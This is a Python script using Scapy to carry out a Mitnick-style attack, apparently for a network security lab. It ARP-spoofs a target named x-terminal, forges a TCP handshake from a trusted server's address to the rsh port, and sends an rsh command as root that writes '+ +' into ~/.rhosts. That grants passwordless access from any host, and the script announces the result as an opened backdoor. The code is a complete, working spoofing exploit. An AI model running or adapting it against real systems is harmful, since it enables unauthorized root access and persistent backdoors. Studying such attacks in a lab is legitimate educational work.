from scapy.all import ARP, IP, TCP, Raw, send, sr1, sniff
from random import randint
from time import sleep
import subprocess
import threading
import re

TRUSTED_SERVER = "10.9.0.6"
X_TERMINAL = "10.9.0.5"
ATTACKER_IP = "10.9.0.1"

RSH_PORT = 514
SRC_PORT = 1023
STDERR_PORT = 1022

INIT_SEQ = randint(0, 42949672)
IP_HEADER = IP(src=TRUSTED_SERVER, dst=X_TERMINAL, flags='DF')

# ---------------------------------------------- HELPERS -------------------------------------------------

def get_interface_name():
    result = subprocess.run(['ifconfig', '-a'], stdout=subprocess.PIPE)
    output = result.stdout.decode()

    interface_regex = re.compile(r'^(br-\w+):', re.MULTILINE)

    interfaces = interface_regex.findall(output)
    return interfaces[0]


def get_mac(ip_address):
    arp_request = ARP(op=1, psrc=ATTACKER_IP, pdst=ip_address)
    arp_response = sr1(arp_request, timeout=2, verbose=0)

    return arp_response.hwsrc

# ---------------------------------------------- HELPERS -------------------------------------------------

# Change some machine configs to propertly execute the attack
def prep_env():
    print("Disabling ip fowarding")
    subprocess.run(["echo 0 > /proc/sys/net/ipv4/ip_forward"], shell=True, stdout=subprocess.PIPE)

    print("Disabling send redirects")
    subprocess.run(["echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects"], shell=True, stdout=subprocess.PIPE)
    sleep(2)


# Spoofing x-terminal -> Keep the arp spoofing updated while running the script
def spoof():
    arp_terminal = ARP(op=2, pdst=X_TERMINAL, hwdst=get_mac(X_TERMINAL), psrc=TRUSTED_SERVER)

    while True:
        send(arp_terminal, verbose=0)
        sleep(1)


if __name__ == "__main__":
    print("Preparing the machine environment...")
    prep_env()

    # Getting interface name for sniffing
    interface = get_interface_name()

    print("\nStarting spoofing...\n")
    threading.Thread(target=spoof, daemon=True).start()
    sleep(2)

    print("Sending fake SYN package...")
    syn_package = IP_HEADER / TCP(seq=INIT_SEQ, sport=SRC_PORT, dport=RSH_PORT, flags="S")
    syn_ack_package = sr1(syn_package, verbose=0)

    print("SYN-ACK received. Sending ACK\n")
    seq = INIT_SEQ + 1
    ack = syn_ack_package.seq + 1
    ack_package = IP_HEADER / TCP(seq=seq, ack=ack, sport=SRC_PORT, dport=RSH_PORT, flags="A")
    send(ack_package, verbose=0)

    print("Establishing RSH Session...")
    rsh_payload = f"{STDERR_PORT}\x00root\x00root\x00echo \"+ +\" >> ~/.rhosts\x00".encode()
    rsh_package = IP_HEADER / TCP(seq=seq, ack=ack, sport=SRC_PORT, dport=RSH_PORT, flags="AP") / Raw(load=rsh_payload)
    send(rsh_package, verbose=0)

    print("Establishing session with RSH STDERR port...\n")
    stderr_filter = f"tcp and src {X_TERMINAL}"
    stderr_syn_package = sniff(filter=stderr_filter, iface=interface, count=1)[0]

    seq = INIT_SEQ
    ack = stderr_syn_package.seq + 1
    stderr_syn_ack_package = IP_HEADER / TCP(seq=seq, ack=ack, sport=STDERR_PORT, dport=SRC_PORT, flags="AS")
    send(stderr_syn_ack_package, verbose=0)

    print("Closing RSH connection...")
    close_rsh_filter = f"tcp and src {X_TERMINAL} and src port {RSH_PORT}"
    fin_rsh_package = sniff(filter=close_rsh_filter, iface=interface, count=1)[0]

    seq = fin_rsh_package.ack
    ack = fin_rsh_package.seq + 1
    close_rsh_package = IP_HEADER / TCP(seq=seq, ack=ack, sport=SRC_PORT, dport=RSH_PORT, flags="A")
    send(close_rsh_package, verbose=0)

    fin_rsh_package = sniff(filter=close_rsh_filter, iface=interface, count=1)[0]

    seq = fin_rsh_package.ack
    ack = fin_rsh_package.seq + 1
    close_rsh_package = IP_HEADER / TCP(seq=seq, ack=ack, sport=SRC_PORT, dport=RSH_PORT, flags="AF")
    send(close_rsh_package, verbose=0)

    print("Closing STDERR connection...\n")
    close_stderr_filter = f"tcp and src {X_TERMINAL} and src port {SRC_PORT}"
    fin_stderr_package = sniff(filter=close_stderr_filter, iface=interface, count=1)[0]

    seq = fin_stderr_package.ack
    ack = fin_stderr_package.seq + 1
    close_stderr_package = IP_HEADER / TCP(seq=seq, ack=ack, sport=STDERR_PORT, dport=SRC_PORT, flags="AF")
    send(close_stderr_package, verbose=0)

    print(f"Backdoor opened. You may access x-terminal ({X_TERMINAL}) with no problems =D\n")